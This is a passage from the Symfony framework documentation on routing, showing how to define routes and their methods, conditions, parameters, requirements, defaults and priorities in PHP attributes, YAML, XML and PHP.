``blog_list`` that matches when the\nuser requests the ``/blog`` URL. When the match occurs, the application runs\nthe ``list()`` method of the ``BlogController`` class.\n\n.. note::\n\n    The query string of a URL is not considered when matching routes. In this\n    example, URLs like ``/blog?foo=bar`` and ``/blog?foo=bar&bar=foo`` will\n    also match the ``blog_list`` route.\n\n.. warning::\n\n    If you define multiple PHP classes in the same file, Symfony only loads the\n    routes of the first class, ignoring all the other routes.\n\nThe route name (``blog_list``) is not important for now, but it will be\nessential later when :ref:`generating URLs <routing-generating-urls>`. You only\nhave to keep in mind that each route name must be unique in the application.\n\nCreating Routes in YAML, XML or PHP Files\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nInstead of defining routes in the controller classes, you can define them in a\nseparate YAML, XML or PHP file. The main advantage is that they don't require\nany extra dependency. The main drawback is that you have to work with multiple\nfiles when checking the routing of some controller action.\n\nThe following example shows how to define in YAML/XML/PHP a route called\n``blog_list`` that associates the ``/blog`` URL with the ``list()`` action of\nthe ``BlogController``:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/routes.yaml\n        blog_list:\n            path: /blog\n            # the controller value has the format 'controller_class::method_name'\n            controller: App\\Controller\\BlogController::list\n\n            # if the action is implemented as the __invoke() method of the\n            # controller class, you can skip the '::method_name' part:\n            # controller: App\\Controller\\BlogController\n\n    .. code-block:: xml\n\n        <!-- config/routes.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing\n                https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n            <!-- the controller value has the format 'controller_class::method_name' -->\n            <route id=\"blog_list\" path=\"/blog\"\n                   controller=\"App\\Controller\\BlogController::list\"/>\n\n            <!-- if the action is implemented as the __invoke() method of the\n                 controller class, you can skip the '::method_name' part:\n                 controller=\"App\\Controller\\BlogController\"/> -->\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes.php\n        use App\\Controller\\BlogController;\n        use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\n        return function (RoutingConfigurator $routes): void {\n            $routes->add('blog_list', '/blog')\n                // the controller value has the format [controller_class, method_name]\n                ->controller([BlogController::class, 'list'])\n\n                // if the action is implemented as the __invoke() method of the\n                // controller class, you can skip the 'method_name' part:\n                // ->controller(BlogController::class)\n            ;\n        };\n\n.. note::\n\n    By default, Symfony loads the routes defined in both YAML and PHP formats.\n    If you define routes in XML format, you need to\n    :ref:`update the src/Kernel.php file <configuration-formats>`.\n\n.. _routing-matching-http-methods:\n\nMatching HTTP Methods\n~~~~~~~~~~~~~~~~~~~~~\n\nBy default, routes match any HTTP verb (``GET``, ``POST``, ``PUT``, etc.)\nUse the ``methods`` option to restrict the verbs each route should respond to:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Controller/BlogApiController.php\n        namespace App\\Controller;\n\n        use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n        use Symfony\\Component\\HttpFoundation\\Response;\n        use Symfony\\Component\\Routing\\Attribute\\Route;\n\n        class BlogApiController extends AbstractController\n        {\n            #[Route('/api/posts/{id}', methods: ['GET', 'HEAD'])]\n            public function show(int $id): Response\n            {\n                // ... return a JSON response with the post\n            }\n\n            #[Route('/api/posts/{id}', methods: ['PUT'])]\n            public function edit(int $id): Response\n            {\n                // ... edit a post\n            }\n        }\n\n    .. code-block:: yaml\n\n        # config/routes.yaml\n        api_post_show:\n            path:       /api/posts/{id}\n            controller: App\\Controller\\BlogApiController::show\n            methods:    GET|HEAD\n\n        api_post_edit:\n            path:       /api/posts/{id}\n            controller: App\\Controller\\BlogApiController::edit\n            methods:    PUT\n\n    .. code-block:: xml\n\n        <!-- config/routes.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing\n                https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n            <route id=\"api_post_show\" path=\"/api/posts/{id}\"\n                controller=\"App\\Controller\\BlogApiController::show\"\n                methods=\"GET|HEAD\"/>\n\n            <route id=\"api_post_edit\" path=\"/api/posts/{id}\"\n                controller=\"App\\Controller\\BlogApiController::edit\"\n                methods=\"PUT\"/>\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes.php\n        use App\\Controller\\BlogApiController;\n        use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\n        return function (RoutingConfigurator $routes): void {\n            $routes->add('api_post_show', '/api/posts/{id}')\n                ->controller([BlogApiController::class, 'show'])\n                ->methods(['GET', 'HEAD'])\n            ;\n            $routes->add('api_post_edit', '/api/posts/{id}')\n                ->controller([BlogApiController::class, 'edit'])\n                ->methods(['PUT'])\n            ;\n        };\n\n.. tip::\n\n    HTML forms only support ``GET`` and ``POST`` methods. If you're calling a\n    route with a different method from an HTML form, add a hidden field called\n    ``_method`` with the method to use (e.g. ``<input type=\"hidden\" name=\"_method\" value=\"PUT\">``).\n    If you create your forms with :doc:`Symfony Forms </forms>` this is done\n    automatically for you when the :ref:`framework.http_method_override <configuration-framework-http_method_override>`\n    option is ``true``.\n\n.. _routing-matching-expressions:\n\nMatching Expressions\n~~~~~~~~~~~~~~~~~~~~\n\nUse the ``condition`` option if you need some route to match based on some\narbitrary matching logic:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Controller/DefaultController.php\n        namespace App\\Controller;\n\n        use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n        use Symfony\\Component\\HttpFoundation\\Response;\n        use Symfony\\Component\\Routing\\Attribute\\Route;\n\n        class DefaultController extends AbstractController\n        {\n            #[Route(\n                '/contact',\n                name: 'contact',\n                condition: \"context.getMethod() in ['GET', 'HEAD'] and request.headers.get('User-Agent') matches '/firefox/i'\",\n                // expressions can also include config parameters:\n                // condition: \"request.headers.get('User-Agent') matches '%app.allowed_browsers%'\"\n            )]\n            public function contact(): Response\n            {\n                // ...\n            }\n\n            #[Route(\n                '/posts/{id}',\n                name: 'post_show',\n                // expressions can retrieve route parameter values using the \"params\" variable\n                condition: \"params['id'] < 1000\"\n            )]\n            public function showPost(int $id): Response\n            {\n                // ... return a JSON response with the post\n            }\n        }\n\n    .. code-block:: yaml\n\n        # config/routes.yaml\n        contact:\n            path:       /contact\n            controller: App\\Controller\\DefaultController::contact\n            condition:  \"context.getMethod() in ['GET', 'HEAD'] and request.headers.get('User-Agent') matches '/firefox/i'\"\n            # expressions can also include configuration parameters:\n            # condition: \"request.headers.get('User-Agent') matches '%app.allowed_browsers%'\"\n            # expressions can even use environment variables:\n            # condition: \"context.getHost() == env('APP_MAIN_HOST')\"\n\n        post_show:\n            path:       /posts/{id}\n            controller: App\\Controller\\DefaultController::showPost\n            # expressions can retrieve route parameter values using the \"params\" variable\n            condition:  \"params['id'] < 1000\"\n\n    .. code-block:: xml\n\n        <!-- config/routes.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing\n                https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n            <route id=\"contact\" path=\"/contact\" controller=\"App\\Controller\\DefaultController::contact\">\n                <condition>context.getMethod() in ['GET', 'HEAD'] and request.headers.get('User-Agent') matches '/firefox/i'</condition>\n                <!-- expressions can also include configuration parameters: -->\n                <!-- <condition>request.headers.get('User-Agent') matches '%app.allowed_browsers%'</condition> -->\n                <!-- expressions can even use environment variables: -->\n                <!-- <condition>context.getHost() == env('APP_MAIN_HOST')</condition> -->\n            </route>\n\n            <route id=\"post_show\" path=\"/posts/{id}\" controller=\"App\\Controller\\DefaultController::showPost\">\n                <!-- expressions can retrieve route parameter values using the \"params\" variable -->\n                <condition>params['id'] &lt; 1000</condition>\n            </route>\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes.php\n        use App\\Controller\\DefaultController;\n        use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\n        return function (RoutingConfigurator $routes): void {\n            $routes->add('contact', '/contact')\n                ->controller([DefaultController::class, 'contact'])\n                ->condition('context.getMethod() in [\"GET\", \"HEAD\"] and request.headers.get(\"User-Agent\") matches \"/firefox/i\"')\n                // expressions can also include configuration parameters:\n                // ->condition('request.headers.get(\"User-Agent\") matches \"%app.allowed_browsers%\"')\n                // expressions can even use environment variables:\n                // ->condition('context.getHost() == env(\"APP_MAIN_HOST\")')\n            ;\n            $routes->add('post_show', '/posts/{id}')\n                ->controller([DefaultController::class, 'showPost'])\n                // expressions can retrieve route parameter values using the \"params\" variable\n                ->condition('params[\"id\"] < 1000')\n            ;\n        };\n\nThe value of the ``condition`` option is an expression using any valid\n:doc:`expression language syntax </reference/formats/expression_language>` and\ncan use any of these variables created by Symfony:\n\n``context``\n    An instance of :class:`Symfony\\\\Component\\\\Routing\\\\RequestContext`,\n    which holds the most fundamental information about the route being matched.\n\n``request``\n    The :ref:`Symfony Request <component-http-foundation-request>` object that\n    represents the current request.\n\n``params``\n    An array of matched :ref:`route parameters <routing-route-parameters>` for\n    the current route.\n\nYou can also use these functions:\n\n``env(string $name)``\n    Returns the value of a variable using :doc:`Environment Variable Processors <configuration/env_var_processors>`\n\n``service(string $alias)``\n    Returns a routing condition service.\n\n    First, add the ``#[AsRoutingConditionService]`` attribute or ``routing.condition_service``\n    tag to the services that you want to use in route conditions::\n\n        use Symfony\\Bundle\\FrameworkBundle\\Routing\\Attribute\\AsRoutingConditionService;\n        use Symfony\\Component\\HttpFoundation\\Request;\n\n        #[AsRoutingConditionService(alias: 'route_checker')]\n        class RouteChecker\n        {\n            public function check(Request $request): bool\n            {\n                // ...\n            }\n        }\n\n    Then, use the ``service()`` function to refer to that service inside conditions::\n\n        // Controller (using an alias):\n        #[Route(condition: \"service('route_checker').check(request)\")]\n        // Or without alias:\n        #[Route(condition: \"service('App\\\\\\Service\\\\\\RouteChecker').check(request)\")]\n\nBehind the scenes, expressions are compiled down to raw PHP. Because of this,\nusing the ``condition`` key causes no extra overhead beyond the time it takes\nfor the underlying PHP to execute.\n\n.. warning::\n\n    Conditions are *not* taken into account when generating URLs (which is\n    explained later in this article).\n\nDebugging Routes\n~~~~~~~~~~~~~~~~\n\nAs your application grows, you'll eventually have a *lot* of routes. Symfony\nincludes some commands to help you debug routing issues. First, the ``debug:router``\ncommand lists all your application routes in the same order in which Symfony\nevaluates them:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:router\n\n    ----------------  -------  -------  -----  --------------------------------------------\n    Name              Method   Scheme   Host   Path\n    ----------------  -------  -------  -----  --------------------------------------------\n    homepage          ANY      ANY      ANY    /\n    contact           GET      ANY      ANY    /contact\n    contact_process   POST     ANY      ANY    /contact\n    article_show      ANY      ANY      ANY    /articles/{_locale}/{year}/{title}.{_format}\n    blog              ANY      ANY      ANY    /blog/{page}\n    blog_show         ANY      ANY      ANY    /blog/{slug}\n    ----------------  -------  -------  -----  --------------------------------------------\n\nPass the name (or part of the name) of some route to this argument to print the\nroute details:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:router app_lucky_number\n\n    +-------------+---------------------------------------------------------+\n    | Property    | Value                                                   |\n    +-------------+---------------------------------------------------------+\n    | Route Name  | app_lucky_number                                        |\n    | Path        | /lucky/number/{max}                                     |\n    | ...         | ...                                                     |\n    | Options     | compiler_class: Symfony\\Component\\Routing\\RouteCompiler |\n    |             | utf8: true                                              |\n    +-------------+---------------------------------------------------------+\n\n.. tip::\n\n    Use the ``--show-aliases`` option to show all available aliases for a given\n    route.\n\nThe other command is called ``router:match`` and it shows which route will match\nthe given URL. It's useful to find out why some URL is not executing the\ncontroller action that you expect:\n\n.. code-block:: terminal\n\n    $ php bin/console router:match /lucky/number/8\n\n      [OK] Route \"app_lucky_number\" matches\n\n.. _routing-route-parameters:\n\nRoute Parameters\n----------------\n\nThe previous examples defined routes where the URL never changes (e.g. ``/blog``).\nHowever, it's common to define routes where some parts are variable. For example,\nthe URL to display some blog post will probably include the title or slug\n(e.g. ``/blog/my-first-post`` or ``/blog/all-about-symfony``).\n\nIn Symfony routes, variable parts are wrapped in ``{ }``.\nFor example, the route to display the blog post contents is defined as ``/blog/{slug}``:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Controller/BlogController.php\n        namespace App\\Controller;\n\n        use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n        use Symfony\\Component\\HttpFoundation\\Response;\n        use Symfony\\Component\\Routing\\Attribute\\Route;\n\n        class BlogController extends AbstractController\n        {\n            // ...\n\n            #[Route('/blog/{slug}', name: 'blog_show')]\n            public function show(string $slug): Response\n            {\n                // $slug will equal the dynamic part of the URL\n                // e.g. at /blog/yay-routing, then $slug='yay-routing'\n\n                // ...\n            }\n        }\n\n    .. code-block:: yaml\n\n        # config/routes.yaml\n        blog_show:\n            path:       /blog/{slug}\n            controller: App\\Controller\\BlogController::show\n\n    .. code-block:: xml\n\n        <!-- config/routes.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing\n                https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n            <route id=\"blog_show\" path=\"/blog/{slug}\"\n                   controller=\"App\\Controller\\BlogController::show\"/>\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes.php\n        use App\\Controller\\BlogController;\n        use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\n        return function (RoutingConfigurator $routes): void {\n            $routes->add('blog_show', '/blog/{slug}')\n                ->controller([BlogController::class, 'show'])\n            ;\n        };\n\nThe name of the variable part (``{slug}`` in this example) is used to create a\nPHP variable where that route content is stored and passed to the controller.\nIf a user visits the ``/blog/my-first-post`` URL, Symfony executes the ``show()``\nmethod in the ``BlogController`` class and passes a ``$slug = 'my-first-post'``\nargument to the ``show()`` method.\n\nRoutes can define any number of parameters, but each of them can only be used\nonce on each route (e.g. ``/blog/posts-about-{category}/page/{pageNumber}``).\n\n.. _routing-requirements:\n\nParameters Validation\n~~~~~~~~~~~~~~~~~~~~~\n\nImagine that your application has a ``blog_show`` route (URL: ``/blog/{slug}``)\nand a ``blog_list`` route (URL: ``/blog/{page}``). Given that route parameters\naccept any value, there's no way to differentiate both routes.\n\nIf the user requests ``/blog/my-first-post``, both routes will match and Symfony\nwill use the route which was defined first. To fix this, add some validation to\nthe ``{page}`` parameter using the ``requirements`` option:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Controller/BlogController.php\n        namespace App\\Controller;\n\n        use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n        use Symfony\\Component\\HttpFoundation\\Response;\n        use Symfony\\Component\\Routing\\Attribute\\Route;\n\n        class BlogController extends AbstractController\n        {\n            #[Route('/blog/{page}', name: 'blog_list', requirements: ['page' => '\\d+'])]\n            public function list(int $page): Response\n            {\n                // ...\n            }\n\n            #[Route('/blog/{slug}', name: 'blog_show')]\n            public function show($slug): Response\n            {\n                // ...\n            }\n        }\n\n    .. code-block:: yaml\n\n        # config/routes.yaml\n        blog_list:\n            path:       /blog/{page}\n            controller: App\\Controller\\BlogController::list\n            requirements:\n                page: '\\d+'\n\n        blog_show:\n            path:       /blog/{slug}\n            controller: App\\Controller\\BlogController::show\n\n    .. code-block:: xml\n\n        <!-- config/routes.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing\n                https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n            <route id=\"blog_list\" path=\"/blog/{page}\" controller=\"App\\Controller\\BlogController::list\">\n                <requirement key=\"page\">\\d+</requirement>\n            </route>\n\n            <route id=\"blog_show\" path=\"/blog/{slug}\"\n                   controller=\"App\\Controller\\BlogController::show\"/>\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes.php\n        use App\\Controller\\BlogController;\n        use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\n        return static function (RoutingConfigurator $routes): void {\n            $routes->add('blog_list', '/blog/{page}')\n                ->controller([BlogController::class, 'list'])\n                ->requirements(['page' => '\\d+'])\n            ;\n\n            $routes->add('blog_show', '/blog/{slug}')\n                ->controller([BlogController::class, 'show'])\n            ;\n            // ...\n        };\n\nThe ``requirements`` option defines the `PHP regular expressions`_ that route\nparameters must match for the entire route to match. In this example, ``\\d+`` is\na regular expression that matches a *digit* of any length. Now:\n\n========================  =============  ===============================\nURL                       Route          Parameters\n========================  =============  ===============================\n``/blog/2``               ``blog_list``  ``$page`` = ``2``\n``/blog/my-first-post``   ``blog_show``  ``$slug`` = ``my-first-post``\n========================  =============  ===============================\n\n.. tip::\n\n    The :class:`Symfony\\\\Component\\\\Routing\\\\Requirement\\\\Requirement` enum\n    contains a collection of commonly used regular-expression constants such as\n    digits, dates and UUIDs which can be used as route parameter requirements.\n\n    .. configuration-block::\n\n        .. code-block:: php-attributes\n\n            // src/Controller/BlogController.php\n            namespace App\\Controller;\n\n            use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n            use Symfony\\Component\\HttpFoundation\\Response;\n            use Symfony\\Component\\Routing\\Attribute\\Route;\n            use Symfony\\Component\\Routing\\Requirement\\Requirement;\n\n            class BlogController extends AbstractController\n            {\n                #[Route('/blog/{page}', name: 'blog_list', requirements: ['page' => Requirement::DIGITS])]\n                public function list(int $page): Response\n                {\n                    // ...\n                }\n            }\n\n        .. code-block:: yaml\n\n            # config/routes.yaml\n            blog_list:\n                path:       /blog/{page}\n                controller: App\\Controller\\BlogController::list\n                requirements:\n                    page: !php/const Symfony\\Component\\Routing\\Requirement\\Requirement::DIGITS\n\n        .. code-block:: php\n\n            // config/routes.php\n            use App\\Controller\\BlogController;\n            use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n            use Symfony\\Component\\Routing\\Requirement\\Requirement;\n\n            return static function (RoutingConfigurator $routes): void {\n                $routes->add('blog_list', '/blog/{page}')\n                    ->controller([BlogController::class, 'list'])\n                    ->requirements(['page' => Requirement::DIGITS])\n                ;\n                // ...\n            };\n\n.. tip::\n\n    Route requirements (and route paths too) can include\n    :ref:`configuration parameters <configuration-parameters>`, which is useful to\n    define complex regular expressions once and reuse them in multiple routes.\n\n.. tip::\n\n    Parameters also support `PCRE Unicode properties`_, which are escape\n    sequences that match generic character types. For example, ``\\p{Lu}``\n    matches any uppercase character in any language, ``\\p{Greek}`` matches any\n    Greek characters, etc.\n\n.. note::\n\n    When using regular expressions in route parameters, you can set the ``utf8``\n    route option to ``true`` to make any ``.`` character match any UTF-8\n    characters instead of just a single byte.\n\nIf you prefer, requirements can be inlined in each parameter using the syntax\n``{parameter_name<requirements>}``. This feature makes configuration more\nconcise, but it can decrease route readability when requirements are complex:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Controller/BlogController.php\n        namespace App\\Controller;\n\n        use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n        use Symfony\\Component\\HttpFoundation\\Response;\n        use Symfony\\Component\\Routing\\Attribute\\Route;\n\n        class BlogController extends AbstractController\n        {\n            #[Route('/blog/{page<\\d+>}', name: 'blog_list')]\n            public function list(int $page): Response\n            {\n                // ...\n            }\n        }\n\n    .. code-block:: yaml\n\n        # config/routes.yaml\n        blog_list:\n            path:       /blog/{page<\\d+>}\n            controller: App\\Controller\\BlogController::list\n\n    .. code-block:: xml\n\n        <!-- config/routes.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing\n                https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n            <route id=\"blog_list\" path=\"/blog/{page<\\d+>}\"\n                   controller=\"App\\Controller\\BlogController::list\"/>\n\n            <!-- ... -->\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes.php\n        use App\\Controller\\BlogController;\n        use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\n        return static function (RoutingConfigurator $routes): void {\n            $routes->add('blog_list', '/blog/{page<\\d+>}')\n                ->controller([BlogController::class, 'list'])\n            ;\n            // ...\n        };\n\nOptional Parameters\n~~~~~~~~~~~~~~~~~~~\n\nIn the previous example, the URL of ``blog_list`` is ``/blog/{page}``. If users\nvisit ``/blog/1``, it will match. But if they visit ``/blog``, it will **not**\nmatch. As soon as you add a parameter to a route, it must have a value.\n\nYou can make ``blog_list`` once again match when the user visits ``/blog`` by\nadding a default value for the ``{page}`` parameter. When using attributes,\ndefault values are defined in the arguments of the controller action. In the\nother configuration formats they are defined with the ``defaults`` option:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Controller/BlogController.php\n        namespace App\\Controller;\n\n        use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n        use Symfony\\Component\\HttpFoundation\\Response;\n        use Symfony\\Component\\Routing\\Attribute\\Route;\n\n        class BlogController extends AbstractController\n        {\n            #[Route('/blog/{page}', name: 'blog_list', requirements: ['page' => '\\d+'])]\n            public function list(int $page = 1): Response\n            {\n                // ...\n            }\n        }\n\n    .. code-block:: yaml\n\n        # config/routes.yaml\n        blog_list:\n            path:       /blog/{page}\n            controller: App\\Controller\\BlogController::list\n            defaults:\n                page: 1\n            requirements:\n                page: '\\d+'\n\n        blog_show:\n            # ...\n\n    .. code-block:: xml\n\n        <!-- config/routes.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing\n                https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n            <route id=\"blog_list\" path=\"/blog/{page}\" controller=\"App\\Controller\\BlogController::list\">\n                <default key=\"page\">1</default>\n\n                <requirement key=\"page\">\\d+</requirement>\n            </route>\n\n            <!-- ... -->\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes.php\n        use App\\Controller\\BlogController;\n        use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\n        return static function (RoutingConfigurator $routes): void {\n            $routes->add('blog_list', '/blog/{page}')\n                ->controller([BlogController::class, 'list'])\n                ->defaults(['page' => 1])\n                ->requirements(['page' => '\\d+'])\n            ;\n        };\n\nNow, when the user visits ``/blog``, the ``blog_list`` route will match and\n``$page`` will default to a value of ``1``.\n\n.. warning::\n\n    You can have more than one optional parameter (e.g. ``/blog/{slug}/{page}``),\n    but everything after an optional parameter must be optional. For example,\n    ``/{page}/blog`` is a valid path, but ``page`` will always be required\n    (i.e. ``/blog`` will not match this route).\n\nIf you want to always include some default value in the generated URL (for\nexample to force the generation of ``/blog/1`` instead of ``/blog`` in the\nprevious example) add the ``!`` character before the parameter name: ``/blog/{!page}``\n\nAs it happens with requirements, default values can also be inlined in each\nparameter using the syntax ``{parameter_name?default_value}``. This feature\nis compatible with inlined requirements, so you can inline both in a single\nparameter:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Controller/BlogController.php\n        namespace App\\Controller;\n\n        use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n        use Symfony\\Component\\HttpFoundation\\Response;\n        use Symfony\\Component\\Routing\\Attribute\\Route;\n\n        class BlogController extends AbstractController\n        {\n            #[Route('/blog/{page<\\d+>?1}', name: 'blog_list')]\n            public function list(int $page): Response\n            {\n                // ...\n            }\n        }\n\n    .. code-block:: yaml\n\n        # config/routes.yaml\n        blog_list:\n            path:       /blog/{page<\\d+>?1}\n            controller: App\\Controller\\BlogController::list\n\n    .. code-block:: xml\n\n        <!-- config/routes.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing\n                https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n            <route id=\"blog_list\" path=\"/blog/{page<\\d+>?1}\"\n                   controller=\"App\\Controller\\BlogController::list\"/>\n\n            <!-- ... -->\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes.php\n        use App\\Controller\\BlogController;\n        use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\n        return static function (RoutingConfigurator $routes): void {\n            $routes->add('blog_list', '/blog/{page<\\d+>?1}')\n                ->controller([BlogController::class, 'list'])\n            ;\n        };\n\n.. tip::\n\n    To give a ``null`` default value to any parameter, add nothing after the\n    ``?`` character (e.g. ``/blog/{page?}``). If you do this, don't forget to\n    update the types of the related controller arguments to allow passing\n    ``null`` values (e.g. replace ``int $page`` by ``?int $page``).\n\nPriority Parameter\n~~~~~~~~~~~~~~~~~~\n\nSymfony evaluates routes in the order they are defined. If the path of a route\nmatches many different patterns, it might prevent other routes from being\nmatched. In YAML and XML you can move the route definitions up or down in the\nconfiguration file to control their priority. In routes defined as PHP\nattributes this is much harder to do, so you can set the\noptional ``priority`` parameter in those routes to control their priority:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Controller/BlogController.php\n        namespace App\\Controller;\n\n        use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n        use Symfony\\Component\\Routing\\Attribute\\Route;\n\n        class BlogController extends AbstractController\n        {\n            /**\n             * This route has a greedy pattern and is defined first.\n             */\n            #[Route('/blog/{slug}', name: 'blog_show')]\n            public function show(string $slug): Response\n            {\n                // ...\n            }\n\n            /**\n             * This route could not be matched without defining a higher priority than 0.\n             */\n            #[Route('/blog/list', name: 'blog_list', priority: 2)]\n            public function list(): Response\n            {\n                // ...\n            }\n        }\n\nThe priority parameter expects an integer value. Routes with higher priority\nare sorted before routes with lower priority. The default value when it is not\ndefined is ``0``.\n\nParameter Conversion\n~~~~~~~~~~~~~~~~~~~~\n\nA common routing need is to convert the value stored in some parameter (e.g. an\ninteger acting as the user ID) into another value (e.g. the object that\nrepresents the user). This feature is called a \"param converter\".\n\nNow, keep the previous route configuration, but change the arguments of the\ncontroller action. Instead of ``string $slug``, add ``BlogPost $post``::\n\n    // src/Controller/BlogController.php\n    namespace App\\Controller;\n\n    use App\\Entity\\BlogPost;\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Routing\\Attribute\\Route;\n\n    class BlogController extends AbstractController\n    {\n        // ...\n\n        #[Route('/blog/{slug}', name: 'blog_show')]\n        public function show(BlogPost $post): Response\n        {\n            // $post is the object whose slug matches the routing parameter\n\n            // ...\n        }\n    }\n\nIf your controller arguments include type-hints for objects (``BlogPost`` in\nthis case), the \"param converter\" makes a database request to find the object\nusing the request parameters (``slug`` in this case). If no object is found,\nSymfony generates a 404 response automatically.\n\nCheck out the :ref:`Doctrine param conversion documentation <doctrine-entity-value-resolver>`\nto learn about the ``#[MapEntity]`` attribute that can be used to customize the\ndatabase queries used to fetch the object from the route parameter.\n\nBacked Enum Parameters\n~~~~~~~~~~~~~~~~~~~~~~\n\nYou can use PHP `backed enumerations`_ as route parameters because Symfony will\nconvert them automatically to their scalar values.\n\n.. code-block:: php-attributes\n\n    // src/Controller/OrderController.php\n    namespace App\\Controller;\n\n    use App\\Enum\\OrderStatusEnum;\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Routing\\Attribute\\Route;\n\n    class OrderController extends AbstractController\n    {\n        #[Route('/orders/list/{status}', name: 'list_orders_by_status')]\n        public function list(OrderStatusEnum $status = OrderStatusEnum::Paid): Response\n        {\n            // ...\n        }\n    }\n\nSpecial Parameters\n~~~~~~~~~~~~~~~~~~\n\nIn addition to your own parameters, routes can include any of the following\nspecial parameters created by Symfony:\n\n.. _routing-format-parameter:\n.. _routing-locale-parameter:\n\n``_controller``\n    This parameter is used to determine which controller and action is executed\n    when the route is matched.\n\n``_format``\n    The matched value is used to set the \"request format\" of the ``Request`` object.\n    This is used for such things as setting the ``Content-Type`` of the response\n    (e.g. a ``json`` format translates into a ``Content-Type`` of ``application/json``).\n\n``_fragment``\n    Used to set the fragment identifier, which is the optional last part of a URL that\n    starts with a ``#`` character and is used to identify a portion of a document.\n\n``_locale``\n    Used to set the :ref:`locale <translation-locale-url>` on the request.\n\nYou can include these attributes (except ``_fragment``) both in individual routes\nand in route imports. Symfony defines some special attributes with the same name\n(except for the leading underscore) so you can define them easier:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Controller/ArticleController.php\n        namespace App\\Controller;\n\n        // ...\n        class ArticleController extends AbstractController\n        {\n            #[Route(\n                path: '/articles/{_locale}/search.{_format}',\n                locale: 'en',\n                format: 'html',\n                requirements: [\n                    '_locale' => 'en|fr',\n                    '_format' => 'html|xml',\n                ],\n            